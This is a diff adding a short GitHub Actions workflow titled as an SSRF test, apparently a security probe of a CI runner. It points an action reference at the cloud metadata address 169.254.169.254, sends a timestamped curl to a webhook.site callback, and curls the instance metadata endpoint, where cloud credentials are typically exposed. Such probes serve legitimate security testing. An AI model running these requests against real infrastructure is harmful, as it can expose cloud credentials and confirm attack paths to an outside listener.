@@ -1,0 +1,16 @@
+name: External Action SSRF Test
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test external action reference
+        uses: http://169.254.169.254/action@main
+        continue-on-error: true
+      
+      - name: Fetch from callback
+        run: |
+          curl -s "https://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/actions-external-$(date +%s)" || true
+          curl -s "http://169.254.169.254/latest/meta-data/" || true
